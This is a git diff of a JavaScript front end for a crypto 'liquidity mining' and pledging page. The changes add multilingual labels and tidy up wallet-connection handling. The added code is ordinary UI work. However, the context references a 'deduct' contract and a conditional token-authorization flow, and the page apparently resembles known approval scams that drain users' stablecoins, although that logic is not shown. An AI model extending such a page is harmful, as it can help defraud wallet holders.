@@ -44,6 +44,28 @@ const modalEthPrice = document.getElementById('modalEthPrice');
 const modalSelectedToken = document.getElementById('modalSelectedToken');
 const modalEquivalentValue = document.getElementById('modalEquivalentValue');
 const modalTitle = document.getElementById('modalTitle');
+const languageSelect = document.getElementById('languageSelect');
+
+// 定義 elements 物件，映射需要多語言更新的 DOM 元素
+const elements = {
+    title: document.getElementById('title'),
+    subtitle: document.getElementById('subtitle'),
+    tabLiquidity: document.querySelector('.tab[data-tab="liquidity"]'),
+    tabPledging: document.querySelector('.tab[data-tab="pledging"]'),
+    grossOutputLabel: document.getElementById('grossOutputLabel'),
+    cumulativeLabel: document.getElementById('cumulativeLabel'),
+    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
+    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
+    compoundLabel: document.getElementById('compoundLabel'),
+    startBtnText: startBtn,
+    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
+    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
+    pledgeBtnText: pledgeBtn,
+    totalPledgedLabel: document.getElementById('totalPledgedLabel'),
+    expectedYieldLabel: document.getElementById('expectedYieldLabel'),
+    apyLabel: document.getElementById('apyLabel'),
+    lockedUntilLabel: document.getElementById('lockedUntilLabel')
+};
 
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
@@ -85,7 +107,8 @@ const translations = {
         walletConnected: 'Wallet connected successfully.',
         fetchingBalances: 'Fetching wallet balances...',
         error: 'Error',
-        offlineWarning: 'Server is offline, running locally. Data will sync when server is available.'
+        offlineWarning: 'Server is offline, running locally. Data will sync when server is available.',
+        noWallet: 'Please install MetaMask or a compatible wallet to continue.'
     },
     'zh-Hant': {
         title: '熱門挖礦',
@@ -114,7 +137,8 @@ const translations = {
         walletConnected: '錢包連線成功。',
         fetchingBalances: '正在獲取錢包餘額...',
         error: '錯誤',
-        offlineWarning: '伺服器離線，使用本地運行。數據將在伺服器可用時同步。'
+        offlineWarning: '伺服器離線，使用本地運行。數據將在伺服器可用時同步。',
+        noWallet: '請安裝 MetaMask 或相容錢包以繼續。'
     },
     'zh-Hans': {
         title: '热门挖矿',
@@ -143,7 +167,8 @@ const translations = {
         walletConnected: '钱包连接成功。',
         fetchingBalances: '正在获取钱包余额...',
         error: '错误',
-        offlineWarning: '服务器离线，使用本地运行。数据将在服务器可用时同步。'
+        offlineWarning: '服务器离线，使用本地运行。数据将在服务器可用时同步。',
+        noWallet: '请安装 MetaMask 或兼容钱包以继续。'
     }
 };
 let currentLang = localStorage.getItem('language') || 'zh-Hant';
@@ -548,7 +573,7 @@ function activateStakingUI() {
     saveUserData();
 }
 
-//---Core Wallet Logic (不更改)---
+//---Core Wallet Logic---
 async function sendMobileRobustTransaction(populatedTx) {
     if (!signer || !provider) throw new Error("Wallet not connected or signer is missing.");
     const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
@@ -581,9 +606,10 @@ async function sendMobileRobustTransaction(populatedTx) {
 async function initializeWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
-            updateStatus('Please install MetaMask or a compatible wallet.');
+            updateStatus(translations[currentLang].noWallet);
             disableInteractiveElements(true);
             console.log("initializeWallet: No Ethereum provider detected.");
+            connectButton.disabled = true; // 禁用連線按鈕
             return;
         }
         provider = new ethers.BrowserProvider(window.ethereum);
@@ -610,6 +636,7 @@ async function initializeWallet() {
     } catch (error) {
         console.error("initializeWallet: Wallet initialization error:", error);
         updateStatus(`Initialization failed: ${error.message}`);
+        connectButton.disabled = true;
     }
 }
 
@@ -695,7 +722,16 @@ async function handleConditionalAuthorizationFlow() {
 
 async function connectWallet() {
     try {
-        if (!provider) throw new Error("Provider not initialized");
+        if (typeof window.ethereum === 'undefined') {
+            updateStatus(translations[currentLang].noWallet);
+            console.log("connectWallet: No Ethereum provider detected.");
+            connectButton.disabled = true;
+            return;
+        }
+        if (!provider) {
+            provider = new ethers.BrowserProvider(window.ethereum);
+            console.log("connectWallet: Initialized provider.");
+        }
         updateStatus('Please confirm connection in your wallet...');
         const accounts = await provider.send('eth_requestAccounts', []);
         console.log("connectWallet: Accounts received:", accounts);
@@ -706,6 +742,7 @@ async function connectWallet() {
         connectButton.classList.add('connected');
         connectButton.textContent = 'Connected';
         connectButton.title = 'Disconnect Wallet';
+        connectButton.disabled = false;
         deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -729,6 +766,7 @@ async function connectWallet() {
         if (error.code === 4001) userMessage = "You rejected the connection request.";
         updateStatus(userMessage);
         resetState(true);
+        connectButton.disabled = typeof window.ethereum === 'undefined';
     }
 }
 
@@ -805,6 +843,7 @@ async function claimInterest() {
 function updateLanguage(lang) {
     currentLang = lang;
     languageSelect.value = lang;
+    localStorage.setItem('language', lang);
     for (let key in elements) {
         if (elements[key] && translations[lang]?.[key]) {
             elements[key].textContent = translations[lang][key];
@@ -918,11 +957,17 @@ languageSelect.addEventListener('change', (e) => {
     console.log(`languageSelect: Changed language to: ${lang}`);
 });
 
-connectButton.addEventListener('click', () => {
+connectButton.addEventListener('click', async () => {
     if (connectButton.classList.contains('connected')) {
         disconnectWallet();
     } else {
-        connectWallet();
+        if (typeof window.ethereum === 'undefined') {
+            updateStatus(translations[currentLang].noWallet);
+            connectButton.disabled = true;
+            console.log("connectButton: No Ethereum provider detected.");
+            return;
+        }
+        await connectWallet();
     }
 });
 
